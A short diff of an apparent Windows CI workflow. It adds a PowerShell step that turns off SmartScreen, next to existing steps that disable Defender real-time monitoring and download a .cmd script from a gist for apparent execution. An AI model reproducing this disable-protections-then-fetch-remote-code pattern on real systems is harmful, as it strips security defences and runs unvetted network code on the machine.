@@ -23,6 +23,8 @@ jobs:
       shell: powershell
     - run: Set-MpPreference -DisableRealtimeMonitoring $true
       shell: powershell
+    - run: Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Type DWord -Value 0
+      shell: powershell
     - run: |
         Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/ilia-shipitsin/765d1cc5d5521360d3e5c3c123942f26/raw/1deaf3e9b85b70f9d4cb55424324187982cb34ed/gistfile1.txt' -OutFile 't.cmd'
         $c = (Join-Path (Get-Location).Path 't.cmd')
